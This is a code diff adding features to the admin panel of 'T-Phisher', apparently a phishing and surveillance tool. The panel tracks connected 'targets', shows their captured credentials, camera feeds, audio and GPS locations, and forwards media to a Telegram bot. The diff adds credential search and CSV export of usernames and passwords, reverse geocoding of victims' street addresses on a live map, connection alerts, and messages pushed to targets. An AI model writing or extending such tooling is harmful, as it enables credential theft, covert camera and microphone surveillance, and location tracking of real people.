@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>T-Phisher — Admin Panel</title>
   <meta name="description" content="T-Phisher Admin Dashboard">
-  <link rel="stylesheet" href="/admin.css">
+  <link rel="stylesheet" href="./admin.css">
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script src="/socket.io/socket.io.js"></script>
@@ -96,6 +96,7 @@
     </div>
 
     <div class="header-right">
+      <button class="theme-toggle" onclick="toggleTheme()">🌓 Theme</button>
       <span class="header-time" id="header-clock">00:00:00</span>
       <button class="btn-logout" onclick="logout()">LOGOUT</button>
     </div>
@@ -225,7 +226,7 @@
             <thead>
               <tr>
                 <th>#</th>
-                <th>IP Address</th>
+                <th>Target ID</th>
                 <th>Browser</th>
                 <th>OS</th>
                 <th>Device</th>
@@ -276,6 +277,10 @@
             <span class="text-muted text-sm" id="media-count">0 files</span>
           </div>
         </div>
+        <div class="toolbar" style="padding: 0 20px;">
+          <input type="text" id="search-media" class="search-input" placeholder="Search media by IP/Browser..." onkeyup="filterMedia()">
+          <button class="btn-export" onclick="exportMediaJSON()">Export Metadata JSON</button>
+        </div>
         <div id="media-gallery">
           <div class="media-empty" id="media-empty">
             <div class="icon">🖼</div>
@@ -294,6 +299,10 @@
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             Captured Credentials
           </div>
+        </div>
+        <div class="toolbar" style="padding: 20px 20px 0;">
+          <input type="text" id="search-creds" class="search-input" placeholder="Search credentials..." onkeyup="filterCreds()">
+          <button class="btn-export" onclick="exportCredsCSV()">Export CSV</button>
         </div>
         <div class="table-wrap">
           <table>
@@ -324,6 +333,24 @@
 
       <div style="margin-bottom: 12px; font-size: 12px; color: var(--text-muted);">
         Commands are sent to ALL connected targets unless otherwise specified. Media is auto-forwarded to your Telegram bot.
+      </div>
+      
+      <div class="settings-card" style="margin-bottom: 24px;">
+        <h3 style="margin-bottom: 16px;">Notification Settings</h3>
+        <div class="settings-group">
+          <div>
+            <strong>Sound Alerts</strong>
+            <p style="font-size:12px; color:var(--text-muted);">Play a sound when a target connects or sends data.</p>
+          </div>
+          <label class="switch"><input type="checkbox" id="setting-sound" onchange="toggleSetting('sound', this.checked)"><span class="slider"></span></label>
+        </div>
+        <div class="settings-group" style="border:none; margin:0; padding:0;">
+          <div>
+            <strong>Desktop Notifications</strong>
+            <p style="font-size:12px; color:var(--text-muted);">Show a browser notification.</p>
+          </div>
+          <label class="switch"><input type="checkbox" id="setting-desktop" onchange="toggleSetting('desktop', this.checked)"><span class="slider"></span></label>
+        </div>
       </div>
 
       <div class="ctrl-grid">
@@ -434,6 +461,30 @@
 </div>
 
 <!-- ═══════════════════════════════════════════════════════════════
+     TOAST CONTAINER
+═══════════════════════════════════════════════════════════════ -->
+<div id="toast-container"></div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     CONFIRM MODAL
+═══════════════════════════════════════════════════════════════ -->
+<div class="modal-backdrop" id="confirm-modal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 id="confirm-title">Confirm Action</h3>
+      <button class="modal-close" onclick="closeConfirmModal()">✕</button>
+    </div>
+    <div class="modal-body" style="padding-top:10px;">
+      <p id="confirm-message">Are you sure?</p>
+    </div>
+    <div class="modal-actions" style="margin-top:20px;">
+      <button class="btn-secondary" onclick="closeConfirmModal()">Cancel</button>
+      <button class="btn-primary" id="confirm-btn-yes" style="background:#ff4757;">Yes, Delete</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
      JAVASCRIPT
 ═══════════════════════════════════════════════════════════════ -->
 <script>
@@ -533,6 +584,7 @@ function initWebSocket() {
   // Direct events mappings
   ws.on('INIT', (msg) => { handleMessage({ type: 'INIT', ...msg }); });
   ws.on('TARGET_CONNECTED', (msg) => { handleMessage({ type: 'TARGET_CONNECTED', ...msg }); });
+  ws.on('TARGET_UPDATED', (msg) => { handleMessage({ type: 'TARGET_UPDATED', ...msg }); });
   ws.on('TARGET_DISCONNECTED', (msg) => { handleMessage({ type: 'TARGET_DISCONNECTED', ...msg }); });
   ws.on('LOCATION_UPDATE', (msg) => { handleMessage({ type: 'LOCATION_UPDATE', ...msg }); });
   ws.on('NEW_LOG', (msg) => { handleMessage({ type: 'NEW_LOG', ...msg }); });
@@ -731,6 +783,16 @@ function handleMessage(msg) {
       targets[msg.user.clientId] = msg.user;
       refreshUsersPanel();
       updateHeaderStats();
+      if (localStorage.getItem('setting-sound') === 'true') playAlertSound();
+      if (localStorage.getItem('setting-desktop') === 'true') showDesktopNotification('Target Connected', `New target connected from ${msg.user.ip}`);
+      break;
+    }
+
+    case 'TARGET_UPDATED': {
+      if (targets[msg.user.clientId]) {
+        targets[msg.user.clientId] = msg.user;
+        refreshUsersPanel();
+      }
       break;
     }
 
@@ -824,10 +886,10 @@ function refreshUsersPanel() {
     ovEl.innerHTML = '<div class="empty-state"><div class="icon">📡</div><p>No active targets</p></div>';
   } else {
     ovEl.innerHTML = `<div class="table-wrap"><table><thead><tr>
-      <th>IP</th><th>Browser</th><th>OS</th><th>Location</th></tr></thead>
+      <th>User/IP</th><th>Browser</th><th>OS</th><th>Location</th></tr></thead>
       <tbody>${targetList.slice(0, 5).map(t => `
         <tr>
-          <td class="ip-text">${t.ip}</td>
+          <td class="ip-text">${t.username ? `<strong>${t.username}</strong>` : t.ip}</td>
           <td><span class="tag cyan">${t.browser}</span></td>
           <td>${t.os}</td>
           <td class="loc-text">${t.location ? `${t.location.lat.toFixed(4)}, ${t.location.lng.toFixed(4)}` : '—'}</td>
@@ -845,7 +907,7 @@ function refreshUsersPanel() {
   tbody.innerHTML = targetList.map(t => `
     <tr>
       <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">#${t.clientId}</td>
-      <td class="ip-text">${t.ip}</td>
+      <td class="ip-text">${t.username ? `<strong>${t.username}</strong><br><span style="font-size:10px;color:var(--text-muted)">${t.ip}</span>` : t.ip}</td>
       <td><span class="tag cyan">${t.browser}</span></td>
       <td><span class="tag purple">${t.os}</span></td>
       <td><span class="tag ${t.device === 'Mobile' ? 'green' : ''}">${t.device}</span></td>
@@ -853,8 +915,12 @@ function refreshUsersPanel() {
       <td style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${fmtTime(t.connectedAt)}</td>
       <td>
         <div class="action-btns">
-          <button class="btn-action photo" onclick="requestFrom(${t.clientId}, 'photo')">📸 Photo</button>
-          <button class="btn-action audio" onclick="requestFrom(${t.clientId}, 'audio')">🎙 Audio</button>
+          <button class="btn-action photo" onclick="requestFrom(${t.clientId}, 'photo')">📸</button>
+          <button class="btn-action audio" onclick="requestFrom(${t.clientId}, 'audio')">🎙</button>
+        </div>
+        <div class="send-notification-form">
+          <input type="text" id="notif-${t.clientId}" placeholder="Send Alert...">
+          <button onclick="sendNotification(${t.clientId})">Send</button>
         </div>
       </td>
     </tr>
@@ -1004,21 +1070,55 @@ function renderMediaItem(item, prepend) {
   }
 }
 
-async function deleteMedia(id) {
-  if (!confirm('Are you sure you want to delete this media item?')) return;
-  try {
-    const res = await fetch(`/api/media/${id}`, { method: 'DELETE' });
-    const data = await res.json();
-    if (data.success) {
-      showToast('Media deleted successfully', 'success');
-      // The DOM will update via the DELETE_MEDIA websocket event broadcast by the server
-    } else {
-      showToast('Failed to delete media: ' + (data.message || 'Unknown error'), 'error');
+function showToast(message, type = 'info') {
+  const container = document.getElementById('toast-container');
+  if (!container) return;
+  const toast = document.createElement('div');
+  toast.className = `toast ${type}`;
+  let icon = 'ℹ️';
+  if (type === 'success') icon = '✅';
+  if (type === 'error') icon = '❌';
+  toast.innerHTML = `<span class="toast-icon">${icon}</span><span>${message}</span>`;
+  container.appendChild(toast);
+  setTimeout(() => {
+    toast.style.animation = 'fadeOutRight 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards';
+    setTimeout(() => toast.remove(), 300);
+  }, 3000);
+}
+
+function confirmAction(message, onConfirm) {
+  const modal = document.getElementById('confirm-modal');
+  const msgEl = document.getElementById('confirm-message');
+  const yesBtn = document.getElementById('confirm-btn-yes');
+  if (!modal) return;
+  msgEl.textContent = message;
+  modal.classList.add('open');
+  yesBtn.onclick = () => {
+    modal.classList.remove('open');
+    onConfirm();
+  };
+}
+
+function closeConfirmModal() {
+  const modal = document.getElementById('confirm-modal');
+  if (modal) modal.classList.remove('open');
+}
+
+function deleteMedia(id) {
+  confirmAction('Are you sure you want to delete this media item?', async () => {
+    try {
+      const res = await fetch(`/api/media/${id}`, { method: 'DELETE' });
+      const data = await res.json();
+      if (data.success) {
+        showToast('Media deleted successfully', 'success');
+      } else {
+        showToast('Failed to delete media: ' + (data.message || 'Unknown error'), 'error');
+      }
+    } catch (err) {
+      console.error(err);
+      showToast('Error deleting media', 'error');
     }
-  } catch (err) {
-    console.error(err);
-    showToast('Error deleting media', 'error');
-  }
+  });
 }
 
 function downloadMedia(id) {
@@ -1083,14 +1183,126 @@ function switchTab(name) {
 }
 
 function initLiveMap() {
-  // Initialize with a default view (world map)
-  liveMap = L.map('location-map').setView([20, 0], 2);
-  
-  // Esri World Imagery (Satellite View)
-  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-    attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
-  }).addTo(liveMap);
+  // Google Maps-style street map (CartoDB Voyager — free, with full labels)
+  const voyager = L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+    attribution: '&copy; <a href="https://carto.com/">CARTO</a> &copy; <a href="https://www.openstreetmap.org/copyright">OSM</a>',
+    subdomains: 'abcd',
+    maxZoom: 20
+  });
+
+  // Satellite imagery (Esri)
+  const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+    attribution: 'Tiles &copy; Esri',
+    maxZoom: 18
+  });
+
+  // Satellite + Labels overlay
+  const satLabels = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}', {
+    maxZoom: 18
+  });
+  const satelliteWithLabels = L.layerGroup([satellite, satLabels]);
+
+  // Dark mode (CARTO Dark)
+  const dark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    attribution: '&copy; CARTO',
+    subdomains: 'abcd',
+    maxZoom: 20
+  });
+
+  // Terrain / Topo map
+  const terrain = L.tileLayer('https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png', {
+    attribution: '&copy; OpenTopoMap',
+    maxZoom: 17
+  });
+
+  // Initialize with Voyager (Google Maps lookalike)
+  liveMap = L.map('location-map', {
+    center: [20, 0],
+    zoom: 2,
+    layers: [voyager],
+    zoomControl: false
+  });
+
+  // Move zoom control to bottom-right
+  L.control.zoom({ position: 'bottomright' }).addTo(liveMap);
+
+  const baseMaps = {
+    "🗺️ Street Map": voyager,
+    "🛰️ Satellite": satelliteWithLabels,
+    "🌙 Dark Mode": dark,
+    "⛰️ Terrain": terrain
+  };
+
+  L.control.layers(baseMaps, null, { position: 'topright', collapsed: true }).addTo(liveMap);
+
+  // Add search box to map
+  const searchControl = L.control({ position: 'topleft' });
+  searchControl.onAdd = function() {
+    const div = L.DomUtil.create('div', 'map-search-box');
+    div.innerHTML = `
+      <input type="text" id="map-search-input" placeholder="Search a place..." autocomplete="off">
+      <button id="map-search-btn">🔍</button>
+    `;
+    L.DomEvent.disableClickPropagation(div);
+    return div;
+  };
+  searchControl.addTo(liveMap);
+
+  document.getElementById('map-search-btn').addEventListener('click', searchPlace);
+  document.getElementById('map-search-input').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') searchPlace();
+  });
+
+  // Add "Fit All Targets" button
+  const fitControl = L.control({ position: 'topleft' });
+  fitControl.onAdd = function() {
+    const btn = L.DomUtil.create('button', 'map-fit-btn');
+    btn.innerHTML = '📍 Fit All Targets';
+    btn.title = 'Zoom to fit all target markers';
+    btn.onclick = function() { fitAllMarkers(); };
+    L.DomEvent.disableClickPropagation(btn);
+    return btn;
+  };
+  fitControl.addTo(liveMap);
 }
+
+function searchPlace() {
+  const query = document.getElementById('map-search-input').value.trim();
+  if (!query) return;
+  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}&limit=1`)
+    .then(r => r.json())
+    .then(results => {
+      if (results.length > 0) {
+        const { lat, lon, display_name } = results[0];
+        liveMap.setView([parseFloat(lat), parseFloat(lon)], 15);
+        L.popup()
+          .setLatLng([parseFloat(lat), parseFloat(lon)])
+          .setContent(`<strong>${display_name}</strong>`)
+          .openOn(liveMap);
+      } else {
+        showToast('Place not found.', 'error');
+      }
+    })
+    .catch(() => showToast('Search failed.', 'error'));
+}
+
+function fitAllMarkers() {
+  const keys = Object.keys(mapMarkers);
+  if (keys.length === 0) {
+    showToast('No targets on map yet.', 'error');
+    return;
+  }
+  const group = L.featureGroup(keys.map(k => mapMarkers[k]));
+  liveMap.fitBounds(group.getBounds().pad(0.3));
+}
+
+// Custom pulsing marker icon
+const userIcon = L.divIcon({
+  className: 'user-pulse-marker',
+  html: '<div class="pulse-ring"></div><div class="pulse-dot"></div>',
+  iconSize: [24, 24],
+  iconAnchor: [12, 12]
+});
 
 function updateMapMarker(clientId, lat, lng) {
   if (!liveMap) return;
@@ -1098,10 +1310,42 @@ function updateMapMarker(clientId, lat, lng) {
   if (mapMarkers[clientId]) {
     mapMarkers[clientId].setLatLng([lat, lng]);
   } else {
-    // Create new marker
-    mapMarkers[clientId] = L.marker([lat, lng]).addTo(liveMap)
-      .bindPopup(`Target #${clientId}<br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}`);
+    // Create new marker with custom icon
+    mapMarkers[clientId] = L.marker([lat, lng], { icon: userIcon }).addTo(liveMap);
+      
+    // Pan map to new marker
+    liveMap.setView([lat, lng], 13);
   }
+
+  // Fetch address via reverse geocoding and update popup
+  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`)
+    .then(res => res.json())
+    .then(data => {
+      const placeName = data.display_name || 'Unknown Location';
+      mapMarkers[clientId].bindPopup(`
+        <div style="text-align: center; min-width: 150px; max-width: 250px;">
+          <strong style="color: #0056b3; font-size: 14px;">Target #${clientId}</strong><br>
+          <div style="font-size: 12px; color: #444; margin-top: 5px; word-wrap: break-word;">
+            <strong>${placeName}</strong><br>
+            <span style="color: #888;">Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}</span>
+          </div>
+          <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="display: inline-block; margin-top: 8px; font-size: 11px; color: #fff; background: #00d2ff; padding: 4px 8px; border-radius: 4px; text-decoration: none;">View in Google Maps</a>
+        </div>
+      `).openPopup();
+    })
+    .catch(err => {
+      console.error("Geocoding failed:", err);
+      mapMarkers[clientId].bindPopup(`
+        <div style="text-align: center; min-width: 120px;">
+          <strong style="color: #0056b3; font-size: 14px;">Target #${clientId}</strong><br>
+          <div style="font-size: 12px; color: #444; margin-top: 5px;">
+            Lat: ${lat.toFixed(5)}<br>
+            Lng: ${lng.toFixed(5)}
+          </div>
+          <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="display: inline-block; margin-top: 8px; font-size: 11px; color: #fff; background: #00d2ff; padding: 4px 8px; border-radius: 4px; text-decoration: none;">View in Google Maps</a>
+        </div>
+      `);
+    });
 }
 
 // ─── Commands ─────────────────────────────────────────────────────
@@ -1225,6 +1469,7 @@ function refreshCameraGrid() {
             <video id="camera-live-video-${cid}" autoplay playsinline muted style="display:none; width: 100%; height: 100%; object-fit: cover;"></video>
             <div class="camera-overlay-info" id="camera-overlay-info-${cid}" style="display:none">
               <span class="cam-overlay-rec">● LIVE</span>
+              <span class="cam-overlay-fps" id="cam-overlay-fps-${cid}">0 fps</span>
             </div>
           </div>
 
@@ -1234,6 +1479,14 @@ function refreshCameraGrid() {
           </div>
 
           <div class="camera-stats-box">
+            <div class="camera-stat-row">
+              <span class="camera-stat-label">FPS</span>
+              <span class="camera-stat-value" id="cam-fps-${cid}">0</span>
+            </div>
+            <div class="camera-stat-row">
+              <span class="camera-stat-label">Frames</span>
+              <span class="camera-stat-value" id="cam-frames-${cid}">0</span>
+            </div>
             <div class="camera-stat-row">
               <span class="camera-stat-label">Facing Mode</span>
               <div class="camera-facing-btns">
@@ -1579,6 +1832,100 @@ window.addEventListener('DOMContentLoaded', () => {
     attemptLogin(savedPass);
   }
 });
+// ─── NEW FEATURES JAVASCRIPT ──────────────────────────────────
+function toggleTheme() {
+  const isLight = document.body.classList.toggle('light-mode');
+  localStorage.setItem('theme', isLight ? 'light' : 'dark');
+}
+
+function applySavedSettings() {
+  if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-mode');
+  document.getElementById('setting-sound').checked = localStorage.getItem('setting-sound') === 'true';
+  document.getElementById('setting-desktop').checked = localStorage.getItem('setting-desktop') === 'true';
+}
+window.addEventListener('load', applySavedSettings);
+
+function toggleSetting(key, checked) {
+  localStorage.setItem('setting-' + key, checked);
+  if (key === 'desktop' && checked && Notification.permission !== 'granted') {
+    Notification.requestPermission();
+  }
+}
+
+function playAlertSound() {
+  const audio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
+  audio.play().catch(e => console.log('Audio blocked', e));
+}
+
+function showDesktopNotification(title, body) {
+  if (Notification.permission === 'granted') {
+    new Notification(title, { body, icon: '/meta-logo.png' });
+  }
+}
+
+function sendNotification(clientId) {
+  const input = document.getElementById('notif-' + clientId);
+  if (input && input.value) {
+    ws.send(JSON.stringify({ type: 'send_notification', targetId: clientId, message: input.value }));
+    showToast('Notification sent to target.', 'success');
+    input.value = '';
+  }
+}
+
+function filterCreds() {
+  const search = document.getElementById('search-creds').value.toLowerCase();
+  const rows = document.getElementById('creds-tbody').getElementsByTagName('tr');
+  for (let i = 0; i < rows.length; i++) {
+    if (rows[i].innerText.toLowerCase().includes(search)) {
+      rows[i].style.display = '';
+    } else {
+      rows[i].style.display = 'none';
+    }
+  }
+}
+
+function exportCredsCSV() {
+  if (credentials.length === 0) return alert('No credentials to export.');
+  let csv = 'ID,IP,Username,Password,Date,Time\n';
+  credentials.forEach(c => {
+    csv += `${c.id},"${c.ip}","${c.username}","${c.password}","${c.date}","${c.time}"\n`;
+  });
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const url = window.URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.setAttribute('hidden', '');
+  a.setAttribute('href', url);
+  a.setAttribute('download', 'credentials_export.csv');
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+function filterMedia() {
+  const search = document.getElementById('search-media').value.toLowerCase();
+  const items = document.querySelectorAll('.media-card');
+  items.forEach(item => {
+    if (item.innerText.toLowerCase().includes(search)) {
+      item.style.display = '';
+    } else {
+      item.style.display = 'none';
+    }
+  });
+}
+
+function exportMediaJSON() {
+  if (mediaItems.length === 0) return alert('No media to export.');
+  const copy = mediaItems.map(m => ({ ...m, data: '[BASE64_DATA_REMOVED_FOR_SIZE]' }));
+  const blob = new Blob([JSON.stringify(copy, null, 2)], { type: 'application/json' });
+  const url = window.URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.setAttribute('hidden', '');
+  a.setAttribute('href', url);
+  a.setAttribute('download', 'media_metadata_export.json');
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
 </script>
 
 </body>
